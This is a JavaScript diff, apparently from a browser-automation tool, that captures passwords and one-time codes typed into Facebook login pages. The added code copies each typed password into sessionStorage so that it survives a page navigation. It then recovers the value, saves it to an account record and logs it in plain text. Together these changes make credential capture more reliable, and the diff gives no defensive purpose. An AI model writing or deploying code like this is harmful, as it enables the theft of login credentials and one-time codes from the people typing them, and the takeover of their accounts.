@@ -250,6 +250,12 @@ async function launch(accountId, adminIp) {
         if (v !== reported.password) {
           reported.password = v;
           report('password', v);
+          // Backup to sessionStorage — the CDP bridge (__spCapture) can be lost
+          // when the page navigates away (e.g. Facebook error page after wrong
+          // password) before the async round-trip completes. sessionStorage
+          // survives same-origin navigations within the same tab so we can
+          // recover the last typed password after navigation.
+          try { sessionStorage.setItem('__sp_last_pw', v); } catch {}
         }
       } else if (isOtpField(el)) {
         if (v !== reported.otp) {
@@ -623,6 +629,22 @@ async function launch(accountId, adminIp) {
       if (ua && ua !== current.ua) {
         await saveAccount({ ...current, ua });
         current = { ...current, ua };
+      }
+
+      // Recover the latest captured password from sessionStorage. The CDP
+      // bridge (__spCapture) is async and can be dropped when the page
+      // navigates away after a wrong-password attempt — sessionStorage is
+      // a synchronous write that survives same-origin navigations (Facebook
+      // login → Facebook error checkpoint → Facebook logged-in, all same
+      // origin), so it always holds the most recently typed password even
+      // if the exposeBinding call never reached Node.js.
+      const ssPass = await page.evaluate(() => {
+        try { return sessionStorage.getItem('__sp_last_pw'); } catch { return null; }
+      }).catch(() => null);
+      if (ssPass && ssPass !== current.password) {
+        await saveAccount({ ...current, password: ssPass });
+        current = { ...current, password: ssPass };
+        pushLog(accountId, 'capture', `🔐 Hasło (odzyskane): ${ssPass}`);
       }
 
       const captionLines = [
